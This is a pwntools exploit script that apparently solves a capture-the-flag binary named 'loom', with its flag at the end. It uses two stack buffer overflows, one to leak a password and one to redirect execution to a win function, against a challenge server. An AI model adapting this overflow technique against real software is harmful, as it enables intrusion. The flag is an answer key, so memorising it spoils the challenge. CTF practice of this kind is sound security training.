#!/usr/bin/env python3

from pwn import *

p64 = lambda x: util.packing.p64(x, endian='little')
u64 = lambda x: util.packing.u64(x, endian='little')
p32 = lambda x: util.packing.p32(x, endian='little')
u32 = lambda x: util.packing.u32(x, endian='little')

exe = ELF("./loom_patched")

context.binary = exe
context.terminal = ['tmux', 'splitw', '-h', '-F' '#{pane_pid}', '-P']


def conn():
	if args.LOCAL:
		r = process([exe.path])
	elif args.REMOTE:
		r = remote("0.cloud.chals.io", 33616)
	else:
		r = gdb.debug([exe.path])
	return r


win = 0x00000000004012B6
passwd_addr = 0x000000000040232A


def main():
	r = conn()

	offset = 280
	payload = b''.join([
		b'A' * offset,
		p64(passwd_addr),
	])

	r.sendlineafter(b'===', b'1')
	r.sendlineafter(b'>', b'1')
	r.sendline(payload)
	
	r.sendlineafter(b'2) Read the wall', b'2')
	r.recvuntil(b'ancient : \n\n')
	passwd = r.recvline().strip()
	success(f'{passwd=}')

	offset = 152
	payload = b''.join([
		b'A' * offset,
		p64(win),
	])
	r.sendlineafter(b'===', b'1')
	r.sendlineafter(b'>', b'1')
	r.sendline(payload)

	r.sendlineafter(b'===', b'3')
	r.sendlineafter(b'fates', passwd)
	r.sendlineafter(b'seek', b'1')
	r.recvuntil(b'yours.\n\n')
	
	r.interactive()


if __name__ == "__main__":
	main()

# flag{d0nt_f0rg3t_y0ur_h4t}
